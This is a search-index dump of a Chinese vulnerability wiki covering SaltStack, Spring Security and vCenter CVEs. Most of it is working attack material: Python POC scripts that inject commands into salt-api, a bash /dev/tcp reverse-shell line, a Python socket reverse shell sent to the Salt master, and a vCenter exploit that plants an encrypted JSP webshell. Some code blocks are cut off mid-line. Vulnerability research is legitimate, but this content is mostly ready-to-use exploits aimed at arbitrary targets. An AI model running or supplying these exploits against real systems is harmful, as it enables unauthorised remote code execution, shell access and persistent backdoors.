","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:2:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:3:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"漏洞复现 salt-api REST接口默认使用cherrypy框架，从run接口的实现上可以看出通过client参数动态调用NetapiClient类中的方法。 文中指定代码位置采用以下约定 FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() low参数为外部传入参数，salt.utils.args.format_call方法将参数赋值给kwargs。 当client参数为ssh时，动态调用salt/netapi/init.py:NetapiClient.ssh(), 该方法未采用任何鉴权。 salt/netapi/init.py:NetapiClient.ssh() 跟进，路径如下： salt/netapi/init.py:NetapiClient.ssh()⇒salt/client/ssh/client.py:SSHClient.cmd_sync()⇒salt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() 该方法将kwargs外部可控参数更新值opts变量，该变量可以理解为SaltStack系统的环境变量，使用该变量初始化salt.client.ssh.SSH。 salt/client/ssh/init.py:SSH.init() priv的值从opts变量中获取，并调用salt.client.ssh.shell.gen_key()方法。 salt/client/ssh/shell.py:gen_key() POC请求包为 POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token=12312\u0026client=ssh\u0026tgt=*\u0026fun=a\u0026roster=whip1ash\u0026ssh_priv=aaa|wget http://xxx.dnslog.cn 反弹shell的方法 先写 bash文件，内容为反弹shell语句，使用wget下载到目标中 #!/bin/sh bash -c 'exec bash -i \u0026\u003e/dev/tcp/xxx.xxx.xxx.xxx/9999 \u003c\u00261' 监听端口，使用 /bin/bash 运行文件 反弹shell ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:4:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"漏洞POC POC目录中 peiqi.sh文件 需要更改反弹ip,port,并上传到服务器让目标进行下载 DNS有响应则代表可能有漏洞，便可以进行反弹shell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: SaltStack Version \u003c 2019.2.4 \u0026 \u003c 3000.2 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog \u003e\u003e\u003e xxx.dnslog.cn \\033[0m') print('+ \\033[36mFile_addr \u003e\u003e\u003e http://xxx.xxx.xxx/cmd.sh \\033[0m') print('+ \\033[36mFile_name \u003e\u003e\u003e cmd.sh \\033[0m') print('+------------------------------------------') def POC_1(target_url, dnslog): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312\u0026client=ssh\u0026tgt=*\u0026fun=a\u0026roster=whip1ash\u0026ssh_priv=peiqi|wget http://{}\".format(dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 wget http://{} \\033[0m\".format(dnslog)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 请查看 Dnslog响应 \\033[0m\") while True: Chois = input(\"\\033[35m是否反弹 Shell(Y/N) \u003e\u003e\u003e \\033[0m\") if Chois == \"Y\" or Chois == \"y\": File_addr = input(\"\\033[35mFile_addr \u003e\u003e\u003e \\033[0m\") File_name = input(\"\\033[35mFile_name \u003e\u003e\u003e \\033[0m\") POC_2(target_url, File_addr, File_name) else: sys.exit(0) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, File_addr, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312\u0026client=ssh\u0026tgt=*\u0026fun=a\u0026roster=whip1ash\u0026ssh_priv=peiqi|wget {}\".format(File_addr) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 wget {} \\033[0m\".format(File_addr)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 成功下载{} \\033[0m\".format(File_addr)) POC_3(target_url, File_name) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312\u0026client=ssh\u0026tgt=*\u0026fun=a\u0026roster=whip1ash\u0026ssh_priv=peiqi|/bin/bash {}\".format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 /bin/bash \\033[0m\".format(File_name)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 命令执行完毕，请查看是否反弹Shell \\033[0m\".format(Fil","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:5:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"参考文章 https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag ","date":"0001-01-01","objectID":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/:6:0","tags":null,"title":"","uri":"/saltstack-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-16846-25592/"},{"categories":null,"content":"Saltstack 远程命令执行漏洞 CVE-2020-11651 11652 ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:0:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"漏洞描述 SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。 在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。 在 CVE-2020-11652 目录遍历漏洞中，攻击者通过构造恶意请求，可以读取、写入服务器上任意文件。 ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:1:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"漏洞影响 SaltStack Version \u003c 2019.2.4 SaltStack Version \u003c 3000.2 ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:2:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:3:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"漏洞复现 salt-master普遍使用这两行代码进行认证，其中clear_load是可控输入点。 auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_info首先会识别clear_load输入的字段并选用其中之一作为认证方式，然后传参到check_authentication方法检验认证是否有效。 在第三种认证方式auth_type=='user'中，会由_prep_auth_info获取到系统opt的key，传递到check_authentication中和API参数中携带的key进行==比对。 理论上_prep_auth_info是不可被外部调用的，漏洞成因即是攻击者通过匿名API直接调用_prep_auth_info方法，在回显中拿到self.key，并在后续的请求中使用获取到的key过验证，以root权限执行高危指令。 Mworker daemon进程处理API请求： class MWorker(salt.utils.process.SignalHandlingProcess): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" 其中 handle_clear \u0026 handle_aes 函数分别处理明文和加密指令： 在这里，self._clear_funcs 是 class ClearFuncs 的实例，在这里API访问者可以无认证调用任意的类函数。 class ClearFuncs(TransportMethods): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info()将self.key返回给API造成泄露。攻击者可先通过这一方法拿到key，然后通过认证接口下发shell指令。 之前存在漏洞的代码中仅过滤掉__开头的private方法，导致_prep_auth_info泄露，patch中对clearfuncs和aesfuncs两个类添加了expose白名单过滤： 这里使用 POC 来复现 下载地址: https://github.com/jasperla/CVE-2020-11651-poc 读取文件 /etc/passwd 反弹sell（这里使用另一个POC） 下载地址: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:4:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"漏洞利用POC 下载地址 # BASE https://github.com/bravery9/SaltStack-Exp # 微信公众号：台下言书 # -*- coding:utf-8 -*- - from __future__ import absolute_import, print_function, unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') def check_salt_version(): print(\"[+] Salt 版本: {}\".format(salt.version.__version__)) vi = salt.version.__version_info__ if (vi \u003c (2019, 2, 4) or (3000,) \u003c= vi \u003c (3000, 2)): return True else: return False def check_connection(master_ip, master_port, channel): print(\"[+] Checking salt-master ({}:{}) status... \".format(master_ip, master_port), end='') sys.stdout.flush() try: channel.send({'cmd': 'ping'}, timeout=2) print('\\033[1;32m可以连接\\033[0m') except salt.exceptions.SaltReqTimeoutError: print(\"\\033[1;31m无法连接\\033[0m\") sys.exit(1) def check_CVE_2020_11651(channel): sys.stdout.flush() # try to evil try: rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"\\033[1;32m不存在漏洞\\033[0m\") except: print(\"\\033[1;32m未知错误\\033[0m\") raise else: pass finally: if rets: root_key = rets[2]['root'] print(\"\\033[1;31m存在漏洞\\033[0m\") return root_key return None def pwn_read_file(channel, root_key, path, master_ip): # print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': path, 'saltenv': 'base', } rets = channel.send(msg, timeout=3) print(rets['data']['return'][0][path]) def pwn_getshell(channel, root_key, LHOST, LPORT): msg = {\"key\": root_key, \"cmd\": \"runner\", 'fun': 'salt.cmd', \"kwarg\": { \"fun\": \"cmd.exec_code\", \"lang\": \"python3\", \"code\": \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{}\\\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\".format( LHOST, LPORT) }, 'jid': '20200504042611133934', 'user': 'sudo_user', '_stamp': '2020-05-04T04:26:13.609688'} try: response = channel.send(msg, timeout=3) print(\"Got response for attempting master shell: \" + str(response) + \". Looks promising!\") return True except: print(\"something failed\") return False def pwn_exec(channel, root_key, exec_cmd, master_or_minions): if master_or_minions == \"master\": msg = {\"key\": root_key, \"cmd\": \"runner\", 'fun': 'salt.cmd', \"kwarg\": { \"fun\": \"cmd.exec_code\", \"lang\": \"python3\", \"code\": \"import subprocess;subprocess.call('{}',shell=True)\".format(exec_cmd) }, 'jid': '20200504042611133934', 'user': 'sudo_user', '_stamp': '2020-05-04T04:26:13.609688'} try: response = channel.send(msg, timeout=3) print(\"Got response for attempting master shell: \" + str(response) + \". Looks promising!\") return True except: print(\"something failed\") return False if master_or_minions == \"minions\": print(\"Sending command to all minions on master\") jid = \"{0:%Y%m%d%H%M%S%f}\".format(datetime.datetime.utcnow()) cmd = \"/bin/sh -c '{0}'\".format(exec_cmd) msg = {'cmd': \"_send_pub\", \"fun\": \"cmd.run\", \"arg\": [cmd], \"tgt\": \"*\", \"ret\": \"\", \"tgt_type\": \"glob\", \"user\": \"root\", \"jid\": jid} try: response = channel.send(msg, timeout=3) if response == None: return True else: return False except: return False ##################################### master_ip=input('目标IP：') master_port='4506' channel = init_minion(master_ip, master_port) try: root_key = check_CVE_2020_11651(channel) except: pass while master_ip!='': print('1.测试POC 2.读取文件 3.执行命令(无回显) 4.反弹shell 5.退出') whattype=input('请选择：') if whattype=='1': check_salt_version() # 检查salt版本 check_connection(master_ip, master_port, ch","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:5:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"参考文章 https://www.cdxy.me/?p=822 ","date":"0001-01-01","objectID":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/:6:0","tags":null,"title":"","uri":"/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-11651-11652/"},{"categories":null,"content":"VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978 ","date":"0001-01-01","objectID":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/:0:0","tags":null,"title":"","uri":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/"},{"categories":null,"content":"漏洞描述 VMware Spring Security是美国威睿（VMware）公司的一套为基于Spring的应用程序提供说明性安全保护的安全框架。VMware Spring Security存在授权问题漏洞，该漏洞源于在应用程序中使用 RegexRequestMatcher 以及正则表达式的通配符（.）处理不受信任的输入时存在输入验证错误。 参考链接： https://xz.aliyun.com/t/11473 ","date":"0001-01-01","objectID":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/:1:0","tags":null,"title":"","uri":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/"},{"categories":null,"content":"漏洞影响 Spring Security 5.5.x \u003c 5.5.7 Spring Security 5.6.x \u003c 5.6.4 Spring Security 其他低版本同样受影响 ","date":"0001-01-01","objectID":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/:2:0","tags":null,"title":"","uri":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/"},{"categories":null,"content":"漏洞复现 正常访问/admin/下任何路由均会提示403。 在/admin/下任何路由中，插入%0a或者%0d,即可绕过验证访问页面。 poc： /admin/%0a%0d 例如： GET /admin/%0atest HTTP/1.1 GET /admin/%0dtest HTTP/1.1 GET /admin/%0a%0d%0dtest HTTP/1.1 ","date":"0001-01-01","objectID":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/:3:0","tags":null,"title":"","uri":"/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/"},{"categories":null,"content":"VMware vCenter Server 任意文件上传漏洞 CVE-2021-22005 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:0:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"漏洞描述 VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。 2021年9月22日，VMware官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:1:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"漏洞影响 VMware vCenter Server 7.0系列 \u003c 7.0 U2c VMware vCenter Server 6.7系列 \u003c 6.7 U3o VMware vCenter Server 6.5系列 不受漏洞影响 其余漏洞受影响版本可参考 ：https://www.vmware.com/security/advisories/VMSA-2021-0020.html 安全版本： VMware vCenter Server 7.0 U2c VMware vCenter Server 6.7 U3o ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:2:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:3:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"EXP 可以针对 /analytics/telemetry/ph/api/level 执行 cURL 请求来识别服务器是否受影响： curl -k -v \"https://your-ip/analytics/telemetry/ph/api/level?_c=test\" 如果服务器 Response 200/OK，响应内容不包含 OFF，则容易受到攻击。 如果服务器 Response 200/OK，响应内容包含 OFF，则可能不易受到攻击，且未修复。 如果服务器 Response 400/Bad Request，则已修复。 如果服务器 Response 404/Not Found，则要么不适用，要么已应用解决方法。该解决方法会禁用受影响的 API。 漏洞 exp 部署 webshell： python3 CVE-2021-22005_poc.py -t https://your-ip import requests import random import string import sys import time import requests import urllib3 import argparse urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def id_generator(size=6, chars=string.ascii_lowercase + string.digits): return ''.join(random.choice(chars) for _ in range(size)) def escape(_str): _str = _str.replace(\"\u0026\", \"\u0026amp;\") _str = _str.replace(\"\u003c\", \"\u0026lt;\") _str = _str.replace(\"\u003e\", \"\u0026gt;\") _str = _str.replace(\"\\\"\", \"\u0026quot;\") return _str def str_to_escaped_unicode(arg_str): escaped_str = '' for s in arg_str: val = ord(s) esc_uni = \"\\\\u{:04x}\".format(val) escaped_str += esc_uni return escaped_str def createAgent(target, agent_name, log_param): url = \"%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s\u0026_i=%s\" % (target, agent_name, log_param) headers = { \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0\", \"X-Deployment-Secret\": \"abc\", \"Content-Type\": \"application/json\", \"Connection\": \"close\" } json_data = { \"manifestSpec\":{}, \"objectType\": \"a2\", \"collectionTriggerDataNeeded\": True, \"deploymentDataNeeded\":True, \"resultNeeded\": True, \"signalCollectionCompleted\":True, \"localManifestPath\": \"a7\", \"localPayloadPath\": \"a8\", \"localObfuscationMapPath\": \"a9\" } requests.post(url, headers=headers, json=json_data, verify=False) def generate_manifest(webshell_location, webshell): manifestData = \"\"\"\u003cmanifest recommendedPageSize=\"500\"\u003e \u003crequest\u003e \u003cquery name=\"vir:VCenter\"\u003e \u003cconstraint\u003e \u003ctargetType\u003eServiceInstance\u003c/targetType\u003e \u003c/constraint\u003e \u003cpropertySpec\u003e \u003cpropertyNames\u003econtent.about.instanceUuid\u003c/propertyNames\u003e \u003cpropertyNames\u003econtent.about.osType\u003c/propertyNames\u003e \u003cpropertyNames\u003econtent.about.build\u003c/propertyNames\u003e \u003cpropertyNames\u003econtent.about.version\u003c/propertyNames\u003e \u003c/propertySpec\u003e \u003c/query\u003e \u003c/request\u003e \u003ccdfMapping\u003e \u003cindepedentResultsMapping\u003e \u003cresultSetMappings\u003e \u003centry\u003e \u003ckey\u003evir:VCenter\u003c/key\u003e \u003cvalue\u003e \u003cvalue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\"\u003e \u003cresourceItemToJsonLdMapping\u003e \u003cforType\u003eServiceInstance\u003c/forType\u003e \u003cmappingCode\u003e\u003c![CDATA[ #set($appender = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))## #set($orig_log = $appender.getFile())## #set($logger = $GLOBAL-logger.logger.parent)## $appender.setFile(\"%s\")## $appender.activateOptions()## $logger.warn(\"%s\")## $appender.setFile($orig_log)## $appender.activateOptions()##]]\u003e \u003c/mappingCode\u003e \u003c/resourceItemToJsonLdMapping\u003e \u003c/value\u003e \u003c/value\u003e \u003c/entry\u003e \u003c/resultSetMappings\u003e \u003c/indepedentResultsMapping\u003e \u003c/cdfMapping\u003e \u003crequestSchedules\u003e \u003cschedule interval=\"1h\"\u003e \u003cqueries\u003e \u003cquery\u003evir:VCenter\u003c/query\u003e \u003c/queries\u003e \u003c/schedule\u003e \u003c/requestSchedules\u003e \u003c/manifest\u003e\"\"\" % (webshell_location, webshell) return manifestData def arg(): parser = argparse.ArgumentParser() parser.add_argument(\"-t\", \"--target\", help = \"Target\", required = True) args = parser.parse_args() target = args.target print(\"[*] Target: %s\" % target) return target def exec(): target = arg() # Variables webshell_param = id_generator(6) log_param = id_generator(6) agent_name = id_generator(6) shell_name = \"Server.jsp\" webshell = \"\"\"\u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.g","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:3:1","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"vCenter cookie 读取登录 存储关键身份验证信息数据位置： # Linux /storage/db/vmware-vmdir/data.mdb #Windows C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb 解密脚本： https://github.com/horizon3ai/vcenter_saml_login 运行得到 VSPHERE-UI-JESSIONID： python3 vcenter_saml_login.py -p data.mdb -t your-ip 